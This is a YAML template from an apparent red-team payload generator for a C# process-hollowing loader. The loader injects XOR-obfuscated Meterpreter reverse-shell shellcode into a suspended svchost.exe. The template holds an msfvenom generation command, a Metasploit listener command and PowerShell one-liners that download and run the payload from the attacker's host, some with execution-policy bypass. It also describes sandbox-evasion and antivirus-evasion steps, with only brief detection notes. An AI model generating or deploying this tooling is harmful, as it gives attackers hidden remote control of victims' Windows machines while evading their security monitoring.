meta:
  name: "Process Hollowing, XOR (C#)"
  category: "Process Injection"
  description: |
    Process hollowing technique that spawns svchost.exe in suspended state and overwrites its entrypoint with shellcode.
    
    Features:
    - XOR encryption for basic obfuscation (key: 0xfa)
    - 10-second sleep sandbox evasion
    - Spawns legitimate svchost.exe process
    - PEB parsing to locate entrypoint
    - Overwrites entrypoint with shellcode
    - Resumes execution to trigger payload
    
    This advanced technique creates a legitimate process in suspended state,
    parses its Process Environment Block (PEB) to find the entrypoint address,
    overwrites it with malicious shellcode, then resumes the thread.
    The process appears to be legitimate svchost.exe to simple monitoring tools.
    
    WARNING: For authorized security testing only!

  effectiveness: "high"

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055.012 - Process Injection: Process Hollowing"

  artifacts:
    - "svchost.exe process creation in suspended state"
    - "ZwQueryInformationProcess calls"
    - "ReadProcessMemory/WriteProcessMemory API calls"
    - "ResumeThread execution"
    - "Modified entrypoint in svchost.exe"
    - "10-second sleep before execution"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "hollowing.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
    output_var: "raw_shellcode"

  # Step 2: XOR encrypt the shellcode
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 3: Format encrypted shellcode as C# byte array
  - type: "script"
    name: "format_payload"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "csharp_payload"

output:
  type: "template"
  template: "process_hollowing/xor_hollowing.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
  launch_instructions: |
    C# XOR Process Hollowing - Launch Instructions

    Start Listener:
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Transfer and Execute:
    python3 -m http.server 8080
    On target: powershell -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"

    In-Memory Execution:
    python3 -m http.server 8080
    On target: powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:8080/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [ProcessHollowing.Program]::Main(@())"

    Notes:
    - XOR encrypted with key: 0x{{ xor_key }}
    - 10-second sleep for sandbox evasion (sandboxes often skip delays)
    - Spawns C:\Windows\System32\svchost.exe in suspended state (CREATE_SUSPENDED flag)
    - Parses PEB (Process Environment Block) to locate executable entrypoint
    - Overwrites entrypoint with XOR-decoded shellcode via WriteProcessMemory
    - Resumes thread to execute payload
    - Process appears as legitimate svchost.exe in process list
    - Requires x64 Windows system
    - More evasive than direct injection (no CreateRemoteThread)
    - Technique: ZwQueryInformationProcess → Read PEB → Parse PE → Get entrypoint → Overwrite → Resume

    Troubleshooting:
    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
    - AV blocks: XOR weak; consider AES, additional obfuscation, or packing
    - Process crashes: Shellcode may be incompatible; verify x64 Meterpreter
    - Immediate termination: AV killed process; check Defender logs
    - Svchost.exe spawns then dies: Entrypoint overwrite may have failed; check PEB parsing
    - Sysmon Event ID 1 (process creation) and Event ID 25 (process tampering) may fire

    Cleanup:
    On target:
    taskkill /F /IM svchost.exe /FI "PID eq [PID]" 2>nul
    del {{ output_file }}
    - Payload waits 10 seconds before execution (sandbox evasion)
    - Requires x64 Windows system
    - svchost.exe must exist at C:\Windows\System32\svchost.exe

    Detection:

    This technique can be detected via:
    - Sysmon Event ID 1 (Process creation - svchost.exe from unusual parent)
    - Sysmon Event ID 8 (CreateRemoteThread)
    - Memory analysis showing RWX regions in svchost.exe
    - Behavioral analysis of svchost.exe making network connections
    - ZwQueryInformationProcess calls from non-system processes

    Cleanup:

    After testing, remove the payload:
    Remove-Item {{ output_file }} -Force
